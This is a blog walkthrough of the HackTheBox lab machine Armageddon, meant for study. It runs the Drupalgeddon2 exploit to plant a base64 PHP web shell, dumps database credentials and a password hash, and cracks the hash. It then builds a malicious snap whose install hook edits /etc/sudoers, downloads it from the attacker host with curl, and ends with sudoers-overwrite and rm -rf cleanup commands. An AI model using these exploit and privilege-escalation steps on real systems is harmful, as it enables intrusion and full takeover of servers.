+++
authors = ["Matt Johnson"]
title = 'HTB: Armageddon Writeup'
date = '2021-07-25'
description = "Here's how to solve HackTheBox's Armageddon."
draft = false
tags = ["hackthebox","security"]
summary = "Here's how to solve HackTheBox's Armageddon."
+++

{{< toc >}}

# High-Level Information

**Machine Name:** Armageddon

**IP Address:** 10.10.10.233

**Difficulty:** Easy

**Summary:** HackTheBox's Armageddon was a relatively easy box, so long as you didn't fall down the rabbit hole. Getting initial access to the machine was as simple as running a PoC exploit against a vulnerable Drupal version. Once on the box, the `apache` user was capable of running MySQL queries, from which you can find an easily crackable password hash of the `brucetherealadmin` user. From there, one needs to craft a malicious snap package in order to escalate privileges to `root`.

**Tools Used:** Nmap, Gobuster, [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2), MySQL, john, fpm, snap

# Initial Foothold

As always, I began by running Nmap:

```shell
┌──(kali@kali)-[~/htb/armageddon]
└─$ nmap -sC -sV -p- -oA nmap/nmap 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 07:22 EDT
Nmap scan report for 10.10.10.233
Host is up (0.035s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.31 seconds
```

Once I discovered that port 80 was open, I enumerated directories with Gobuster:

```shell

┌──(kali@kali)-[~/htb/armageddon]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u http://10.10.10.233
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.233
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/23 07:23:50 Starting gobuster in directory enumeration mode
===============================================================
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]  
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]    
/poc                  (Status: 200) [Size: 21776]                                  
                                                                                    
===============================================================
2021/07/23 07:25:31 Finished
===============================================================
        
```

Nested within the `/modules/` directory (`/modules/system/` to be more precise) was a file `system.info`, which identified the Drupal version as 7.56.

```ini
name = System
description = Handles general site configuration for administrators.
package = Core
version = VERSION
core = 7.x
files[] = system.archiver.inc
files[] = system.mail.inc
files[] = system.queue.inc
files[] = system.tar.inc
files[] = system.updater.inc
files[] = system.test
required = TRUE
configure = admin/config/system

; Information added by Drupal.org packaging script on 2017-06-21
version = "7.56"
project = "drupal"
datestamp = "1498069849"
```

A cursory Google search of the version leads you to a PoC RCE exploit, Drupalgeddon2. Running it grants you a basic PHP shell:

```shell
┌──(kali@kali)-[~/htb/armageddon/drupalexploit]
└─$ ./drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo VJNRMOSG
[+] Result : VJNRMOSG
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : &1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> whoami
apache
armageddon.htb>>
```

# Privilege Escalation

In doing some manual enumeration, I discovered that MySQL was running on the host. From previous experience I know that DB credentials sometimes exist in Drupal configuration files. I enumerated the web server and came across `sites/default/settings.php`, which included the following credentials:

```php
$databases = array (                                                                                                                                                                               
            'default' =>                                                                                                                                                                                     
            array (                                                                                                                                                                                          
              'default' =>                                                                                                                                                                                   
              array (                                                                                                                                                                                        
                'database' => 'drupal',                                                                                                                                                                      
                'username' => 'drupaluser',                                                                                                                                                                  
                'password' => 'CQHEy@9M*m23gBVj',                                                                                                                                                            
                'host' => 'localhost',                                                                                                                                                                       
                'port' => '',                                                                                                                                                                                
                'driver' => 'mysql',                                                                                                                                                                         
                'prefix' => '',                                                                                                                                                                              
              ),                                                                                                                                                                                             
            ),                                                                                                                                                                                               
          );
```

Worth noting that the fake shell isn't actually interactive, so one-liners are your friend. Running some MySQL one-liners using the credentials led me to a password hash for `brucetherealadmin`:

```shell
armageddon.htb>> mysql --user=drupaluser --pass='CQHEy@9M*m23gBVj' -e 'SHOW TABLES' Drupal
...
users
...
armageddon.htb>> mysql --user=drupaluser --pass='CQHEy@9M*m23gBVj' -e 'SELECT * FROM users' drupal
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1 Europe/London            0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
armageddon.htb>>
```

With the hash in hand, I spun up john and cracked away:

```shell
┌──(kali@kali)-[~/htb/armageddon]
└─$ john hash                                                                                                                                                                                      
Using default input encoding: UTF-8                                                                                                                                                                
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])                                                                                                                                      
Cost 1 (iteration count) is 32768 for all loaded hashes                                                                                                                                            
Will run 4 OpenMP threads                                                                                                                                                                          
Proceeding with single, rules:Single                                                                                                                                                               
Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                                                                      
Almost done: Processing the remaining buffered candidate passwords, if any.                                                                                                                        
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist                                                                                                                              
booboo           (?)                                                                                                                                                                               
1g 0:00:00:00 DONE 2/3 (2021-07-23 11:04) 2.631g/s 421.0p/s 421.0c/s 421.0C/s asdfjkl;..bradley                                                                                                    
Use the "--show" option to display all of the cracked passwords reliably                                                                                                                           
Session completed
```

From there, I was able to log in as `brucetherealadmin`.

Running `sudo -l`, I learned that `brucetherealadmin` is capable of running snap as `root`. Fortunately, GTFObins neatly outlines how to exploit that permission to get code execution as `root`. By default, the set of commands only runs `id`, so I took a lesson out of the [author of the dirty\_sock exploit's playbook](https://initblog.com/2019/dirty-sock/) and added `brucetherealadmin` to the `/etc/sudoers` file. Here's the bash script used to create the malicious snap package:

```sh
#!/bin/bash

COMMAND='echo "brucetherealadmin    ALL=(ALL:ALL) ALL" >> /etc/sudoers'
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

For simplicity's sake, I renamed the snap package to `privesc.snap`.

To execute on the system, I did the following:

```shell
[brucetherealadmin@armageddon-tmp]$ curl -o privesc.snap http://10.10.14.8/privesc.snap
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  19649      0 --:--:-- --:--:-- --:--:-- 19692
[brucetherealadmin@armageddon-tmp]$ sudo snap install privesc.snap --devmode --dangerous
error: cannot perform the following tasks:
- Run install hook of "xxxx" snap if present (run hook "install": exit status 1)
[brucetherealadmin@armageddon-tmp]$ sudo /bin/bash
[sudo] password for brucetherealadmin: 
[root@armageddon-tmp]# whoami
root
[root@armageddon-tmp]#
```

It's worth noting that the snap package didn't properly install as it wasn't a real program, but nonetheless the bash installation script executed anyways.

As a bonus, if you wanted to clean up after the fact you could run the following:

```shell
[root@armageddon-opt]# head -n -1 /etc/sudoers > /etc/sudoers
[root@armageddon-opt]# rm -rf /tmp/* /dev/shm/*
```
